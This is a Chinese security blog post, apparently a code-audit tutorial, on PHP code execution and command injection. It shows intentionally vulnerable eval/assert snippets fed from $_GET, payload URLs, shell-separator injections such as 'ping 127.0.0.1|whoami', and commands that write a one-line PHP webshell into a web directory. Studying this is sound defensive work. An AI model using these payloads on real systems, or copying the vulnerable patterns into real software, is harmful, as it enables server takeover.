@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="PHP代码执行注入与命令执行常见的代码执行函数：eval、assert、preg_replaceeval() ：eval()函数会把字符串以php代码执行，字符串必须是合法的php代码。123456//代码执行注入&amp;lt;?php$code = $_GET[&apos;pr0ud&apos;];eval($code);?&amp;gt;">
+<meta name="keywords" content="代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="3、命令注入">
+<meta property="og:url" content="http://msxl.github.io/2020/05/21/3、命令注入/index.html">
+<meta property="og:site_name" content="Pr0ud">
+<meta property="og:description" content="PHP代码执行注入与命令执行常见的代码执行函数：eval、assert、preg_replaceeval() ：eval()函数会把字符串以php代码执行，字符串必须是合法的php代码。123456//代码执行注入&amp;lt;?php$code = $_GET[&apos;pr0ud&apos;];eval($code);?&amp;gt;">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2020-05-21T12:38:16.630Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="3、命令注入">
+<meta name="twitter:description" content="PHP代码执行注入与命令执行常见的代码执行函数：eval、assert、preg_replaceeval() ：eval()函数会把字符串以php代码执行，字符串必须是合法的php代码。123456//代码执行注入&amp;lt;?php$code = $_GET[&apos;pr0ud&apos;];eval($code);?&amp;gt;">
+  <link rel="alternate" href="/atom.xml" title="Pr0ud" type="application/atom+xml">
+  <link rel="canonical" href="http://msxl.github.io/2020/05/21/3、命令注入/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>3、命令注入 | Pr0ud</title>
+  <meta name="generator" content="Hexo 3.9.0">
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Pr0ud</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+      
+    
+
+    <a href="/tags" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签<span class="badge">7</span></a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+      
+    
+
+    <a href="/archives" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档<span class="badge">8</span></a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+      
+    
+
+    <a href="/about" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://msxl.github.io/2020/05/21/3、命令注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Pr0ud">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/images/shell.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pr0ud">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">3、命令注入
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2020-05-21 20:37:42 / 修改时间：20:38:16" itemprop="dateCreated datePublished" datetime="2020-05-21T20:37:42+08:00">2020-05-21</time>
+            </span>
+          
+            
+
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="PHP代码执行注入与命令执行"><a href="#PHP代码执行注入与命令执行" class="headerlink" title="PHP代码执行注入与命令执行"></a>PHP代码执行注入与命令执行</h3><h5 id="常见的代码执行函数："><a href="#常见的代码执行函数：" class="headerlink" title="常见的代码执行函数："></a><strong>常见的代码执行函数：</strong></h5><p>eval、assert、preg_replace</p><p><strong>eval() ：</strong></p><p>eval()函数会把字符串以php代码执行，字符串必须是合法的php代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//代码执行注入</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$code = $_GET[<span class="string">'pr0ud'</span>];</span><br><span class="line"><span class="keyword">eval</span>($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>
+
+
+
+
+<p>payload：<a href="http://127.0.0.1/test.php?pr0ud=echo%20phpinfo()" target="_blank" rel="noopener">http://127.0.0.1/test.php?pr0ud=echo%20phpinfo()</a>;</p>
+<h4 id="assert-："><a href="#assert-：" class="headerlink" title="assert()："></a><strong>assert()：</strong></h4><p>assert()函数把字符串以php代码执行。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//代码执行注入</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$code = $_GET[<span class="string">'pr0ud'</span>];</span><br><span class="line">assert($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="eval-与assert-区别："><a href="#eval-与assert-区别：" class="headerlink" title="eval()与assert()区别："></a><strong>eval()与assert()区别：</strong></h4><p>相同点：两者都可以执行PHP语句</p>
+<p>不同点：eval()规范更加严格，必须符合PHP代码执行要求，assert()则没有那么严格，执行PHP表达式即可。</p>
+<h4 id="preg-replace："><a href="#preg-replace：" class="headerlink" title="preg_replace："></a><strong>preg_replace：</strong></h4><p>preg_replace函数执行一个正则表达式的搜索和替换。</p>
+<p>当pattern 中存在/e 模式修饰符，即允许执行代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//正则代码执行</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> $regexp = $_GET[<span class="string">'reg'</span>];</span><br><span class="line">$String = <span class="string">'&lt;php&gt;phpinfo()&lt;/php&gt;'</span>;</span><br><span class="line">preg_replace(<span class="string">"/&lt;php&gt;(.*?)$regexp"</span>,<span class="string">"\\1"</span>,$String);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：<a href="http://127.0.0.1/test.php?reg=" target="_blank" rel="noopener">http://127.0.0.1/test.php?reg=</a>&lt;/php&gt;/e</p>
+<h5 id="命令执行（命令注入）："><a href="#命令执行（命令注入）：" class="headerlink" title="命令执行（命令注入）："></a><strong>命令执行（命令注入）：</strong></h5><p>命令执行产生函数：exec、shell_exec、system、passthru等将参数以dos、shell执行，exec()、system()、popen()、passthru()、proc_open()、pcntl_exec()、shell_exec() 、反引号` 实际上是使用shell_exec()函数，<strong>此外还要小心mail（）函数的安全。</strong></p>
+<p>system() 输出并返回最后一行shell结果。<br>exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。<br>passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。<br>popen()、proc_open() 不会直接返回执行结果，而是返回一个文件指针</p>
+<h3 id="exec："><a href="#exec：" class="headerlink" title="exec："></a><strong>exec：</strong></h3><p>exec()函数用于执行外部程序并返回输出的最后一行，如果命令失败，则返回NULL。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//命令执行注入</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$command = exec(<span class="string">"ipconfig"</span>,$output,$return_var);</span><br><span class="line">var_dump($command);</span><br><span class="line">var_dump($return_var);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>参数：此函数接受上述三个参数，如下所述：</p>
+<p>$command：该参数用于保存将要执行的命令。</p>
+<p>$output：此参数用于指定将使用命令的每一行输出填充的数组。</p>
+<p>$return_var：$return_var参数与输出参数一起出现，然后它返回已执行命令的状态将写入此变量。</p>
+<p>返回值：该函数返回执行的命令，请务必设置并使用输出参数。</p>
+<h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec:"></a><strong>shell_exec:</strong></h3><p>shell_exec通过shell环境执行命令，并且将完整的输出以字符串的方式返回，如果命令失败，则返回NULL。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//命令执行注入</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$output = shell_exec(<span class="string">"ipconfig"</span>);</span><br><span class="line">var_dump($output)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>$output: 回传内容都会存于此变数中(储存成纯文字内容), 不会直接秀在页面上.</p>
+<h4 id="system"><a href="#system" class="headerlink" title="system():"></a><strong>system():</strong></h4><p>执行外部程序，并且显示输出</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$shell = system(<span class="string">"ipconfig"</span>,$shell_return);</span><br><span class="line"></span><br><span class="line">var_dump($shell_return);</span><br><span class="line">var_dump($shell)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>$shell: 是shell命令, 如’netstat -tnlp’</p>
+<p>$shell_return: shell命令执行的返回结果,命令执行成功返回0, 否则不为0</p>
+<p>该函数执行后,直接在终端窗口打印命令执行的结果</p>
+<p>函数的返回值是命令的执行结果的最后一行</p>
+<h4 id="命令执行利用及绕过姿势"><a href="#命令执行利用及绕过姿势" class="headerlink" title="命令执行利用及绕过姿势"></a><strong>命令执行利用及绕过姿势</strong></h4><h4 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell:"></a>写入webshell:</h4><p>利用命令注入写一句话php webshell到web目录涉及到一些特殊字符的转义，假设需要写入<?php eval($_POST[kang]); ?>，方法如下：</p>
+<p>WINDOWS：用^转义&lt;，即执行echo ^&lt;?php eval($_POST[kang]); ?^&gt; &gt; web可写目录加文件完整名字</p>
+<p>linux下需要用\来转义&lt;，不过很多php都默认开启gpc（魔术引号magic_quotes_gpc()）。可以先用16进制转换一句话再用xxd命令把16进制还原，命令如下：</p>
+<p>echo 3c3f706870206576616c28245f504f53545b6b616e675d293b203f3e|xxd -r -ps &gt; web可写目录加文件完整名字</p>
+<p>后面命令注入也有时间盲注和sql注入很像</p>
+<p><strong>| 命令管道符</strong></p>
+<p>&lt;&gt;&gt;&gt; 文件重定向符</p>
+<p>测试： 0 | dir c:</p>
+<p>　　代码只过滤了部分特殊字符，可以考虑用其他字符进行测试，这边列举一下Window/Linux可利用的特殊字符：</p>
+<p>windows支持：</p>
+<p>|   直接执行后面的语句   ping 127.0.0.1|whoami      </p>
+<p>||   前面出错执行后面的 ，前面为假    ping  2 || whoami </p>
+<p>&amp;  前面的语句为假则直接执行后面的,前面可真可假            ping 127.0.0.1&amp;whoami</p>
+<p>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真   ping 127.0.0.1&amp;&amp;whoami</p>
+<p>Linux支持：</p>
+<p>;   前面的执行完执行后面的    ping 127.0.0.1;whoami  </p>
+<p>|   管道符，显示后面的执行结果  ping 127.0.0.1|whoami       </p>
+<p>11  当前面的执行出错时执行后面的  ping 1||whoami  </p>
+<p>&amp;  前面的语句为假则直接执行后面的,前面可真可假            ping 127.0.0.1&amp;whoami</p>
+<p>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真   ping 127.0.0.1&amp;&amp;whoami</p>
+
+    </div>
+
+    
+    
+    
+        
+      
+        <div id="reward-container">
+  <div></div>
+  <button id="reward-button" disable="enable" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+
+  </div>
+</div>
+
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2020/05/21/2、超全局变量/" rel="next" title="2、超全局变量">
+                  <i class="fa fa-chevron-left"></i> 2、超全局变量
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP代码执行注入与命令执行"><span class="nav-number">1.</span> <span class="nav-text">PHP代码执行注入与命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#常见的代码执行函数："><span class="nav-number">1.0.1.</span> <span class="nav-text">常见的代码执行函数：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#assert-："><span class="nav-number">1.1.</span> <span class="nav-text">assert()：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#eval-与assert-区别："><span class="nav-number">1.2.</span> <span class="nav-text">eval()与assert()区别：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#preg-replace："><span class="nav-number">1.3.</span> <span class="nav-text">preg_replace：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#命令执行（命令注入）："><span class="nav-number">1.3.1.</span> <span class="nav-text">命令执行（命令注入）：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exec："><span class="nav-number">2.</span> <span class="nav-text">exec：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shell-exec"><span class="nav-number">3.</span> <span class="nav-text">shell_exec:</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#system"><span class="nav-number">3.1.</span> <span class="nav-text">system():</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#命令执行利用及绕过姿势"><span class="nav-number">3.2.</span> <span class="nav-text">命令执行利用及绕过姿势</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#写入webshell"><span class="nav-number">3.3.</span> <span class="nav-text">写入webshell:</span></a></li></ol></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/uploads/images/shell.jpg"
+      alt="Pr0ud">
+  <p class="site-author-name" itemprop="name">Pr0ud</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives">
+        
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+      
+        
+      
+        <a href="https://github.com/yourname" title="GitHub &rarr; https://github.com/yourname" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i></a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+      
+        
+      
+        <a href="mailto:msxl8888@163.com" title="E-Mail &rarr; mailto:msxl8888@163.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i></a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+      
+        
+      
+        <a href="https://weibo.com/yourname" title="Weibo &rarr; https://weibo.com/yourname" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i></a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+      
+        
+      
+        <a href="https://twitter.com/yourname" title="Twitter &rarr; https://twitter.com/yourname" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i></a>
+      </span>
+    
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://wileysec.com" title="http://wileysec.com" rel="noopener" target="_blank">Wiley</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://422926799.github.io" title="https://422926799.github.io" rel="noopener" target="_blank">九世</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="http://t.cn/AiQxVyl3" title="http://t.cn/AiQxVyl3" rel="noopener" target="_blank">神风</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://xie2366626231.github.io./" title="https://xie2366626231.github.io./" rel="noopener" target="_blank">沫</a>
+        </li>
+      
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2019 – <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Pr0ud</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
